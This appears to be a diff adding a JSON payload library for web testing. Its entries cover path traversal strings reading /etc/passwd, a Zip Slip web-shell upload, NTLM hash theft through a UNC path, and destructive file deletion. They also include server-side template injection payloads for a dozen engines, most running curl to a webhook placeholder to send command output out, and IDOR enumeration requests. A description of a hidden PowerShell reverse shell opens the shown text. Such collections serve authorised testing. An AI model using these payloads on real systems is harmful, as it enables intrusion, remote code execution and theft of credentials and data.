+      "description": "Full PowerShell reverse shell for Windows. Bypasses execution policy and runs hidden.",
+      "categoryName": "Command Injection",
+      "tags": "[\"command-injection\",\"windows\",\"powershell\",\"reverse-shell\",\"stealth\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Classic Directory Traversal",
+      "content": "../../../../etc/passwd",
+      "description": "Accesses /etc/passwd by traversing up directory tree. Works when input validation is missing.",
+      "categoryName": "Path Traversal",
+      "tags": "[\"path-traversal\",\"file-disclosure\",\"linux\",\"classic\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Null Byte Injection",
+      "content": "../../../../etc/passwd%00.png",
+      "description": "Uses null byte to truncate extension check and read arbitrary files. Works on older PHP versions (<5.3.4).",
+      "categoryName": "Path Traversal",
+      "tags": "[\"path-traversal\",\"null-byte\",\"bypass\",\"legacy\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Double URL Encoding Bypass",
+      "content": "..%252f..%252f..%252f..%252fetc%252fpasswd",
+      "description": "Double encoding bypasses filters that only decode once. %252f decodes to %2f then to /",
+      "categoryName": "Path Traversal",
+      "tags": "[\"path-traversal\",\"encoding\",\"waf-bypass\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Nested Traversal Sequence",
+      "content": "....//....//....//....//etc/passwd",
+      "description": "When inner ../ is stripped, outer sequence remains valid. Source: YesWeHack Path Traversal Guide",
+      "categoryName": "Path Traversal",
+      "tags": "[\"path-traversal\",\"bypass\",\"filter-evasion\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Windows Path Traversal",
+      "content": "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "description": "Windows-style path traversal to read hosts file. Backslashes work on Windows servers.",
+      "categoryName": "Path Traversal",
+      "tags": "[\"path-traversal\",\"windows\",\"file-disclosure\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Absolute Path Bypass",
+      "content": "/etc/passwd",
+      "description": "Uses absolute path when application expects relative paths. Effective when chroot jail is not implemented.",
+      "categoryName": "Path Traversal",
+      "tags": "[\"path-traversal\",\"bypass\",\"absolute-path\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "UNC Path Traversal (Windows NTLM Theft)",
+      "content": "\\\\{{WEBHOOK_DOMAIN}}\\share\\file.txt",
+      "description": "Forces Windows server to connect to attacker SMB share, leaking NTLM hash. Combines path traversal with SSRF.",
+      "categoryName": "Path Traversal",
+      "tags": "[\"path-traversal\",\"windows\",\"ntlm\",\"credential-theft\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Path Traversal in ZIP Upload (Zip Slip)",
+      "content": "Filename in ZIP: ../../../../var/www/html/shell.php",
+      "description": "Extracts malicious file outside intended directory via ZIP upload. Common vulnerability in archive extraction - CVE-2018-1000559",
+      "categoryName": "Path Traversal",
+      "tags": "[\"path-traversal\",\"zip-slip\",\"file-upload\",\"rce\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Mixed Encoding Bypass",
+      "content": "..%2f..%2f..%2f..%2fetc/passwd",
+      "description": "Mixes encoded and unencoded characters to bypass pattern matching. Some WAFs only check for fully encoded or fully decoded patterns.",
+      "categoryName": "Path Traversal",
+      "tags": "[\"path-traversal\",\"encoding\",\"mixed\",\"waf-bypass\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Path Traversal via File Deletion",
+      "content": "DELETE /api/files/../../../../etc/cron.d/malicious",
+      "description": "Uses path traversal in delete endpoints to remove system files. Can cause DoS or security bypass.",
+      "categoryName": "Path Traversal",
+      "tags": "[\"path-traversal\",\"file-deletion\",\"dos\",\"destructive\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Unicode Encoding Bypass",
+      "content": "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+      "description": "Uses overlong UTF-8 encoding (%c0%af for /) to bypass filters. Works on systems that normalize Unicode after validation.",
+      "categoryName": "Path Traversal",
+      "tags": "[\"path-traversal\",\"unicode\",\"utf8\",\"bypass\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Path Traversal with Wildcard",
+      "content": "../../../../etc/pass*",
+      "description": "Uses wildcards to bypass exact filename matching. Some systems expand wildcards before validation.",
+      "categoryName": "Path Traversal",
+      "tags": "[\"path-traversal\",\"wildcard\",\"bypass\",\"glob\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Symbolic Link Following",
+      "content": "Create symlink: ln -s /etc/passwd public/link\nAccess: /download?file=link",
+      "description": "Exploits symbolic link following to access restricted files. Application follows symlink outside intended directory.",
+      "categoryName": "Path Traversal",
+      "tags": "[\"path-traversal\",\"symlink\",\"linux\",\"file-disclosure\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Jinja2 RCE - Python/Flask",
+      "content": "{{request.application.__globals__.__builtins__.__import__('os').popen('curl {{WEBHOOK_URL}}?data=$(whoami)').read()}}",
+      "description": "Executes OS commands through Jinja2 template and exfiltrates output. Works on Flask applications with Jinja2.",
+      "categoryName": "SSTI",
+      "tags": "[\"ssti\",\"jinja2\",\"python\",\"rce\",\"flask\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Jinja2 Config Disclosure",
+      "content": "{{config.items()}}",
+      "description": "Dumps Flask configuration including secret keys and database credentials. High-value target for bug bounty reports.",
+      "categoryName": "SSTI",
+      "tags": "[\"ssti\",\"jinja2\",\"flask\",\"credential-theft\",\"info-disclosure\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Twig RCE - PHP/Symfony",
+      "content": "{{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"curl {{WEBHOOK_URL}}\")}}",
+      "description": "Registers system() as filter callback and executes commands. Source: YesWeHack SSTI Guide",
+      "categoryName": "SSTI",
+      "tags": "[\"ssti\",\"twig\",\"php\",\"rce\",\"symfony\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "FreeMarker RCE - Java",
+      "content": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"curl {{WEBHOOK_URL}}?data=$(whoami)\")}",
+      "description": "Uses FreeMarker's Execute utility to run system commands. Common in Java web applications.",
+      "categoryName": "SSTI",
+      "tags": "[\"ssti\",\"freemarker\",\"java\",\"rce\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Thymeleaf RCE - Java/Spring",
+      "content": "${T(java.lang.Runtime).getRuntime().exec('curl {{WEBHOOK_URL}}?data=$(whoami)')}",
+      "description": "Spring Expression Language (SpEL) injection in Thymeleaf. Works when SpEL evaluation is enabled.",
+      "categoryName": "SSTI",
+      "tags": "[\"ssti\",\"thymeleaf\",\"spring\",\"java\",\"rce\",\"spel\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Pug/Jade RCE - Node.js",
+      "content": "#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(\"child_process\").exec('curl {{WEBHOOK_URL}}')}()}",
+      "description": "Executes Node.js child_process to run system commands. Common in Node.js/Express applications.",
+      "categoryName": "SSTI",
+      "tags": "[\"ssti\",\"pug\",\"jade\",\"nodejs\",\"rce\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "SSTI Detection Polyglot",
+      "content": "${{<%[%'\"}}%\\.",
+      "description": "Triggers different template engines to reveal which is in use. Source: PortSwigger SSTI Guide",
+      "categoryName": "SSTI",
+      "tags": "[\"ssti\",\"detection\",\"polyglot\",\"reconnaissance\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Jinja2 Sandbox Bypass",
+      "content": "{{request['application']['\\x5f\\x5fglobals\\x5f\\x5f']['\\x5f\\x5fbuiltins\\x5f\\x5f']['\\x5f\\x5fimport\\x5f\\x5f']('os')['popen']('id')['read']()}}",
+      "description": "Uses hex encoding to bypass sandboxed Jinja2 environment. Evades filters that block __globals__, __builtins__, etc.",
+      "categoryName": "SSTI",
+      "tags": "[\"ssti\",\"jinja2\",\"sandbox-bypass\",\"encoding\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Velocity RCE - Java",
+      "content": "#set($str=$class.inspect(\"java.lang.String\").type)\n#set($chr=$class.inspect(\"java.lang.Character\").type)\n#set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"curl {{WEBHOOK_URL}}\"))",
+      "description": "Apache Velocity template injection leading to RCE. Used in older Java applications and CMS systems.",
+      "categoryName": "SSTI",
+      "tags": "[\"ssti\",\"velocity\",\"java\",\"rce\",\"apache\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Smarty RCE - PHP",
+      "content": "{system('curl {{WEBHOOK_URL}}?data=`whoami`')}",
+      "description": "Direct command execution in Smarty template engine. Works when {system} function is not disabled.",
+      "categoryName": "SSTI",
+      "tags": "[\"ssti\",\"smarty\",\"php\",\"rce\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "ERB RCE - Ruby/Rails",
+      "content": "<%= `curl {{WEBHOOK_URL}}?data=$(whoami)` %>",
+      "description": "Executes shell commands in Ruby ERB templates. Common in Ruby on Rails applications.",
+      "categoryName": "SSTI",
+      "tags": "[\"ssti\",\"erb\",\"ruby\",\"rails\",\"rce\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Handlebars Prototype Pollution to RCE",
+      "content": "{{#with \"constructor\"}}{{#with split}}{{pop (push \"console.log(require('child_process').execSync('curl {{WEBHOOK_URL}}'))\")}}{{/with}}{{/with}}",
+      "description": "Exploits Handlebars.js prototype pollution to achieve RCE. Source: Handlebars CVE-2021-23383",
+      "categoryName": "SSTI",
+      "tags": "[\"ssti\",\"handlebars\",\"nodejs\",\"prototype-pollution\",\"rce\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Tornado Template RCE - Python",
+      "content": "{% import os %}{{ os.popen('curl {{WEBHOOK_URL}}').read() }}",
+      "description": "Direct module import and command execution in Tornado templates. Works when module imports are allowed.",
+      "categoryName": "SSTI",
+      "tags": "[\"ssti\",\"tornado\",\"python\",\"rce\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Sequential ID Enumeration",
+      "content": "GET /api/users/1234/profile\nGET /api/users/1235/profile\nGET /api/users/1236/profile",
+      "description": "Increments user IDs to access other users' profiles. Automate with Burp Intruder or custom scripts.",
+      "categoryName": "IDOR",
+      "tags": "[\"idor\",\"api\",\"enumeration\",\"sequential\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "UUID Prediction via Timestamp",
+      "content": "UUIDv1 format: xxxxxxxx-xxxx-1xxx-yxxx-xxxxxxxxxxxx\nExample: 550e8400-e29b-11d4-a716-446655440000",
+      "description": "UUIDv1 contains timestamp and MAC address, potentially predictable. UUIDv4 is random, but v1 can be reverse-engineered.",
+      "categoryName": "IDOR",
+      "tags": "[\"idor\",\"uuid\",\"prediction\",\"enumeration\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "GraphQL IDOR",
+      "content": "query {\n  user(id: \"OTHER_USER_ID\") {\n    email\n    phone\n    address\n    ssn\n  }\n}",
+      "description": "Queries other users' sensitive data through GraphQL resolver. Source: Medium - GraphQL IDOR",
+      "categoryName": "IDOR",
+      "tags": "[\"idor\",\"graphql\",\"api\",\"broken-access-control\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Body Parameter Tampering",
+      "content": "{\n  \"user_id\": \"victim_user_id\",\n  \"action\": \"delete_account\"\n}",
+      "description": "Modifies user_id in request body to perform actions on other accounts. Test all ID parameters in POST/PUT requests.",
+      "categoryName": "IDOR",
+      "tags": "[\"idor\",\"parameter-tampering\",\"broken-access-control\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Path Parameter Manipulation",
+      "content": "GET /documents/12345/download\n→ GET /documents/12346/download",
+      "description": "Changes document ID in URL path to access other users' files. Common in document management systems.",
+      "categoryName": "IDOR",
+      "tags": "[\"idor\",\"path-parameter\",\"file-disclosure\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Cookie-Based IDOR",
+      "content": "Cookie: user_id=1234\n→ Cookie: user_id=1235",
+      "description": "Modifies user_id in cookie to impersonate other users. Indicates severe authentication flaw.",
+      "categoryName": "IDOR",
+      "tags": "[\"idor\",\"cookie\",\"session-management\",\"broken-access-control\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Wildcard IDOR",
+      "content": "GET /api/users/*/messages\nGET /api/orders/all",
+      "description": "Uses wildcard or 'all' parameter to retrieve all resources. Sometimes accidentally left in production APIs.",
+      "categoryName": "IDOR",
+      "tags": "[\"idor\",\"wildcard\",\"mass-disclosure\",\"api\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Hash/Token IDOR",
+      "content": "GET /reset-password?token=abc123def456\n→ GET /reset-password?token=abc123def457",
+      "description": "Increments or brute-forces password reset tokens. Effective when tokens are predictable or short.",
+      "categoryName": "IDOR",
+      "tags": "[\"idor\",\"token\",\"brute-force\",\"authentication-bypass\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Numeric ID Wrap-Around",
+      "content": "GET /api/invoices/2147483647 (INT_MAX)\nGET /api/invoices/-2147483648 (INT_MIN)\nGET /api/invoices/0",
+      "description": "Tests integer boundary values to access special or admin records. Some systems store admin data at special IDs.",
+      "categoryName": "IDOR",
+      "tags": "[\"idor\",\"integer-overflow\",\"boundary-testing\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "GUID Enumeration via Timing",
+      "content": "Measure response time for: GET /api/users/valid-guid (fast) vs /api/users/invalid-guid (slower)",
+      "description": "Uses timing differences to enumerate valid GUIDs. Valid IDs may trigger database lookups with different response times.",
+      "categoryName": "IDOR",
+      "tags": "[\"idor\",\"guid\",\"timing-attack\",\"enumeration\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Base64 Encoded ID Manipulation",
+      "content": "Original: /profile?id=MTIzNDU= (12345)\nModified: /profile?id=MTIzNDY= (12346)",
+      "description": "Decodes base64 ID, increments value, re-encodes. Common obfuscation technique that doesn't provide security.",
+      "categoryName": "IDOR",
+      "tags": "[\"idor\",\"base64\",\"encoding\",\"obfuscation\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Multi-Parameter IDOR",
+      "content": "GET /api/messages?user_id=123&conversation_id=456\nModify both: user_id=124&conversation_id=456",
+      "description": "Some endpoints check one parameter but not the relationship between multiple IDs. Test all combinations.",
+      "categoryName": "IDOR",
+      "tags": "[\"idor\",\"multi-parameter\",\"complex-authorization\"]",
+      "isFavorite": false
+    },
+    {
+      "name": "Referrer-Based IDOR",
+      "content": "GET /api/user/1234/data\nReferer: https://app.com/users/1234\n→ Referer: https://app.com/users/1235",
+      "description": "Changes referrer header to bypass client-side authorization checks. Server trusts referrer for access control.",
+      "categoryName": "IDOR",
+      "tags": "[\"idor\",\"referrer\",\"http-header\",\"client-side-bypass\"]",
+      "isFavorite": false
+    }
+  ]
+}
